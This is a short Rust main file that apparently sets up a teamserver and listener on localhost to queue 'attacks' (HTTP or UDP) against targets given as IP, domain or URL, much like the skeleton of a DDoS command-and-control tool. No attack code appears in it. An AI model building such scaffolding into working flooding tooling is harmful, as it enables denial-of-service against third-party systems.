mod listener;
mod teamserver;

use std::sync::Arc;
use tokio::sync::Mutex;

const TEAMSERVER_ADDR: &str = "127.0.0.1:5555";
const LISTENER_ADDR: &str = "127.0.0.1:8000";

enum AttackMethods { 
    HTTP,
    UDP
}

struct Attack {
    methods: AttackMethods,
    name: String                // IP/Domain/URL etc 
}

#[tokio::main]
async fn main() -> Result<(), std::io::Error> {
    let attacks: Arc<Mutex<Vec<Attack>>> = Arc::new(Mutex::new(Vec::new()));

    let attacks_clone = Arc::clone(&attacks);
    let teamserver_task = tokio::task::spawn( async { teamserver::run(TEAMSERVER_ADDR, attacks_clone).await } );
    let listener_task = tokio::task::spawn( async { listener::run(LISTENER_ADDR, attacks).await } );

    // Joining tasks

    teamserver_task.await.unwrap();
    listener_task.await.unwrap();

    Ok(())
}
